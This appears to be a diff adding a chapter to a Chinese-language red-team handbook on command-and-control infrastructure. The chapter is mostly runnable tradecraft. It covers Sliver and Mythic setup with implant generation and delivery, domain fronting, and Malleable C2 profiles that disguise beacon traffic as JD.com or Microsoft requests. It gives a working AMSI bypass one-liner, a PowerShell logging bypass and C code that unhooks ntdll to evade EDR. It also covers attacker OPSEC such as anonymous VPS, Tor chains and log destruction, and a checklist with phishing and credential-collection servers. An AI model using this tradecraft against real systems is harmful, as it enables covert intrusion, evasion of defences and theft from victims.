+# 3. 创建 listener
+sliver > http -l 8080
+sliver > https -l 443 -c /path/to/cert.pem -k /path/to/key.pem
+sliver > mtls -l 8888
+
+# 4. 生成 implant
+sliver > generate --http <listener_name> --os windows --arch amd64 --save /tmp/
+
+# 5. 投递
+# - Web 下载
+# - 邮件附件
+# - U 盘
+
+# 6. 操作
+sliver > use <session-id>
+sliver (IMPLANT) > info
+sliver (IMPLANT) > shell
+sliver (IMPLANT) > upload /local/file /remote/file
+```
+
+**Mythic 部署**：
+```bash
+# 1. 安装
+git clone https://github.com/its-a-feature/Mythic
+cd Mythic
+./mythic-cli install
+./mythic-cli start
+
+# 2. 浏览器访问 https://localhost:7443
+# 创建账户
+
+# 3. 安装 agent
+./mythic-cli install github https://github.com/MythicAgents/Apollo
+./mythic-cli install github https://github.com/MythicAgents/poseidon
+
+# 4. 创建 payload
+# C2 Profiles → HTTP → 配置
+# Payloads → Apollo → generate
+```
+
+### 22.3 域前置 (Domain Fronting)
+
+```bash
+# 原理：CDN（Cloudflare）背后多个网站共享 IP
+# 攻击者 C2 隐藏在合法 CDN 网站后面
+
+# 1. 注册
+# 找一个跑在 CDN 的合法域名
+# 该域名被目标环境的 EDR/代理白名单
+
+# 2. 配置 C2 profile (Cobalt Strike)
+# malleable-c2 profile
+http-get {
+    set uri "/category/news";
+    client {
+        header "Host" "www.microsoft.com";  # 合法 Host 头
+    }
+    server {
+        header "Content-Type" "text/html";
+    }
+}
+
+# 3. 受害者 → www.microsoft.com (CDN) → CDN 内部路由 → 攻击者 C2
+
+# 4. 注意
+# AWS / Google Cloud 已禁用域前置
+# Cloudflare 仍可用但被监控
+```
+
+### 22.4 流量伪装
+
+**Malleable C2 Profile**：
+```bash
+# Cobalt Strike 自定义流量
+# 示例：伪装成京东请求
+http-get {
+    set uri "/api/item/list";
+    client {
+        header "Accept" "application/json";
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
+        header "Referer" "https://item.jd.com/";
+        metadata {
+            base64url;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+    server {
+        header "Content-Type" "application/json";
+        output {
+            base64url;
+            prepend "{\"data\":\"";
+            append "\",\"status\":\"ok\"}";
+            print;
+        }
+    }
+}
+```
+
+**合法证书**：
+```bash
+# 1. Let's Encrypt
+certbot certonly --standalone -d c2.legit.com
+# 免费 + 自动化
+
+# 2. C2 profile 配置证书
+https-certificate {
+    set keystore "/path/to/c2.legit.com.jks";
+    set password "changeit";
+}
+
+# 3. JKS 转换
+keytool -importkeystore -srckeystore c2.legit.com.p12 -srcstoretype PKCS12 -destkeystore c2.legit.com.jks -deststoretype JKS
+
+# 4. 钉住 HTTPS Host
+# C2 listener 配置 Host header
+```
+
+### 22.5 反检测
+
+**AMSI 绕过**：
+```powershell
+# AMSI (Anti-Malware Scan Interface) 拦截 PowerShell 脚本
+# 绕过方法：
+
+# 1. 强制错误
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# 2. Patch amsi.dll
+# 内存中改 AmsiScanBuffer 函数头 → ret
+
+# 3. 字符串混淆
+$a = 'AmsiUtils'; $b = [Ref].Assembly.GetType("System.Management.Automation.$a")...
+
+# 4. PowerShell Downgrade
+PowerShell -Version 2 -Command "..."
+
+# 5. 编码
+[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("..."))
+```
+
+**PowerShell Logging 绕过**：
+```powershell
+# 1. ScriptBlockLogging
+# 改注册表需要管理员 → 改 GPO
+HKLM\SOFTWARE\Microsoft\PowerShell\ScriptBlockLogging
+
+# 2. ModuleLogging
+HKLM\SOFTWARE\Microsoft\PowerShell\ModuleLogging
+
+# 3. 实时绕过
+# 在脚本开头禁用当前进程的 logging
+$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)
+# 修改 cachedGroupPolicySettings
+
+# 4. obfuscation
+# 用混淆工具
+Invoke-Obfuscation
+# https://github.com/danielbohannon/Invoke-Obfuscation
+```
+
+**EDR 绕过**：
+```c
+// 1. Unhook NTDLL
+// 还原 ntdll.dll 的 .text 段（EDR 会 inline hook）
+// 读 fresh copy from disk
+HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+LPVOID fresh = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+// 计算 .text 段偏移
+PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh;
+PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)fresh + dos->e_lfanew);
+PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
+for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+    if (strcmp((char*)section[i].Name, ".text") == 0) {
+        // 拷贝 .text 段到当前进程 ntdll
+        LPVOID dest = (LPVOID)((BYTE*)GetModuleHandleA("ntdll") + section[i].VirtualAddress);
+        memcpy(dest, (BYTE*)fresh + section[i].PointerToRawData, section[i].Misc.VirtualSize);
+        break;
+    }
+}
+VirtualFree(fresh, 0, MEM_RELEASE);
+CloseHandle(hFile);
+
+// 2. Direct Syscall
+// 不走 ntdll，直接 sysenter/syscall
+// shellcode 嵌入 syscall 号
+// 绕过用户态 hook
+
+// 3. Heaven's Gate
+// 32 位进程调用 64 位 syscall
+// 或 64 位进程调用 32 位 syscall
+// 绕过 32/64 位 hook
+
+// 4. ETW (Event Tracing for Windows) Patch
+// 改 EtwEventWrite 头部 → ret
+// 防止 EDR 通过 ETW 监控
+
+// 5. AMSI Bypass (P/Invoke)
+// 调 AmsiScanBuffer 前 patch
+
+// 6. Module Stomping
+// 用合法模块的 .text 段做 shellcode
+// 加载合法 DLL → VirtualFree（保留 .text）→ 写入 shellcode
+// EDR 看不出代码不在合法模块
+
+// 7. Sleep Obfuscation
+// Sleep 时加密内存
+// 定时器唤醒时再解密
+// EDR 扫描不到 shellcode
+```
+
+**进程注入**：
+```c
+// 1. 经典 CreateRemoteThread
+// 2. APC Injection (QueueUserAPC)
+// 3. Thread Hijacking
+// 4. Module Stomping
+// 5. Process Hollowing
+// 6. AtomBombing
+// 7. Process Doppelganging
+// 8. Process Herpaderping
+// 9. Section View Mapping
+// 10. Kernel Callback Manipulation
+```
+
+### 22.6 C2 Profile 模板
+
+**伪装成京东**：
+```bash
+# profile-jd.profile
+http-get {
+    set uri "/api/item/sku";
+    client {
+        header "User-Agent" "okhttp/3.12.1";
+        header "Accept" "application/json";
+        header "Referer" "https://item.jd.com/100012345.html";
+        metadata {
+            base64url;
+            parameter "sku";
+        }
+    }
+    server {
+        header "Content-Type" "application/json";
+        output {
+            base64url;
+            prepend "{\"price\":\"";
+            append "\",\"stock\":100}";
+            print;
+        }
+    }
+}
+http-post {
+    set uri "/api/cart/add";
+    client {
+        header "Content-Type" "application/json";
+        id {
+            base64url;
+            parameter "cart_id";
+        }
+        output {
+            base64url;
+            prepend "{\"action\":\"add\",\"data\":\"";
+            append "\"}";
+            print;
+        }
+    }
+    server {
+        header "Content-Type" "application/json";
+        output {
+            base64url;
+            prepend "{\"result\":\"ok\",\"order\":\"";
+            append "\"}";
+            print;
+        }
+    }
+}
+```
+
+**伪装成微软**：
+```bash
+http-get {
+    set uri "/connecttest.txt";
+    client {
+        header "Host" "www.microsoft.com";
+        header "User-Agent" "Microsoft NCSI";
+    }
+}
+```
+
+### 22.7 OPSEC 与基础设施
+
+**基础 OPSEC**：
+```bash
+# 1. 注册域名
+#   - 用隐私保护 whois
+#   - 不同行动用不同域名
+#   - 域名注册时间避开工作时间
+
+# 2. VPS 选择
+#   - 离岸 + 不与 EDR 厂商关联
+#   - 独立 IP（不与垃圾邮件 / 已知 C2 同 IP）
+#   - 流量审计对抗：自检 IP 是否被 Reputation 库标记
+
+# 3. 域前置准备
+#   - 找被目标白名单的 CDN 域名
+#   - 注册相似域名前缀 → 走 CDN 后端
+
+# 4. 邮箱
+#   - ProtonMail / Tutanota（隐私）
+#   - 一次性邮箱
+
+# 5. 凭据
+#   - 每个目标独立密码
+#   - 1Password / Bitwarden
+
+# 6. 时间同步
+#   - 行动期间用 UTC
+#   - 设备时间与目标地区时区一致（避免异常）
+
+# 7. 工作时间
+#   - 模拟目标员工工作时间
+#   - 避免凌晨 3 点有 C2 流量
+```
+
+**匿名化**：
+```bash
+# 1. TOR
+# C2 走 TOR 出口节点
+# 速度慢但匿名
+
+# 2. VPN 链
+# VPN1 → VPN2 → VPN3 → C2
+# 每层不记录对方
+
+# 3. SSH 隧道
+ssh -D 1080 user@jump
+# SOCKS 代理
+
+# 4. 一次性 VPS
+# 用一次就扔
+
+# 5. 蜜罐意识
+# 主动测试 IP 是否是蜜罐
+# Shodan / Censys 查
+```
+
+**日志管理**：
+```bash
+# 1. 自销毁
+#   - 行动结束后清服务器日志
+#   - 销毁 VPS
+
+# 2. 加密
+#   - 磁盘加密
+#   - 凭据加密存储
+
+# 3. 备份
+#   - 多地备份（加密）
+#   - 备份本身不暴露
+```
+
+### 22.8 红队基础设施清单
+
+**基础设施列表**：
+```
+[ ] C2 域名（≥ 3 个，主备）
+[ ] CDN 域名（≥ 2 个，域前置用）
+[ ] 投递服务器（钓鱼邮件）
+[ ] 收集服务器（凭据收集）
+[ ] SMTP 服务器（邮件投递）
+[ ] 协作服务器（C2 团队）
+[ ] VPN 跳板
+[ ] 一次性 VPS（≥ 5 个）
+[ ] 一次性邮箱（≥ 5 个）
+[ ] 一次性手机号
+```
+
+**工具**：
+```bash
+# 1. 域前置检查
+# https://github.com/redteam-infosec/domain-fronting
+
+# 2. C2 测试
+# https://github.com/microsoft/RingZer0
+# https://github.com/RedTeamOperations/RTO
+
+# 3. EDR 测试
+# https://github.com/Mr-Un1k0d3r/EDRs
+# https://github.com/optiv/ScareCrow
+# https://github.com/NUL0C4T/Go4aRun
+
+# 4. 钓鱼
+# GoPhish
+# evilginx2
+# SET (Social Engineering Toolkit)
+
+# 5. C2
+# Sliver
+# Mythic
+# Havoc
+# Merlin
+# Empire
+
+# 6. 隐蔽通道
+# dnscat2
+# iodine
+# ptunnel
+# icmptunnel
+# chisel
+# socat
+# ligolo-ng
+```
+
+### 22.9 红队基础设施报告模板
+
+```
+【红队基础设施报告】CASE-YYYY-NNNN
+
+【基础设施架构】
+- C2 Server: <1.2.3.4>
+- Domain Front: <cdn-domain.com>
+- Listener: <list>
+- C2 Profile: <profile>
+- 协议: <HTTPS / DNS / SMB>
+- 加密: <AES-256 + RSA>
+
+【域前置】
+- 目标 CDN: <Cloudflare>
+- 真实 Host: <microsoft.com>
+- 解析路径: <受害者 → CDN → 攻击者>
+
+【C2 部署】
+- 框架: <Sliver>
+- Listener: <HTTPS>
+- 证书: <Let's Encrypt>
+- OPSEC: <每次行动换 VPS>
+
+【反检测能力】
+- AMSI 绕过: <Method 1>
+- ETW Patch: <方法>
+- Unhook NTDLL: <实现>
+- Sleep Obfuscation: <实现>
+- Direct Syscall: <实现>
+
+【持久化能力】
+- 计划任务: <cmd>
+- 注册表: <run>
+- WMI Event: <cmd>
+- 服务: <cmd>
+
+【横向能力】
+- 凭据转储: <mimikatz>
+- Kerberoast: <cmd>
+- Pass-the-Hash: <cmd>
+- DCSync: <cmd>
+
+【测试验证】
+- EDR 厂商: <CrowdStrike / SentinelOne / 360>
+- 测试结果: <是否触发>
+- 绕过率: <%>
+
+【建议】
+- 备用 C2: <list>
+- 备用 VPS: <list>
+- 备用域名: <list>
+- 应急销毁: <流程>
+```
+
+---
+
 ## 附录 A · 工号对照
 
 | 工号 | 角色 | 专长 |
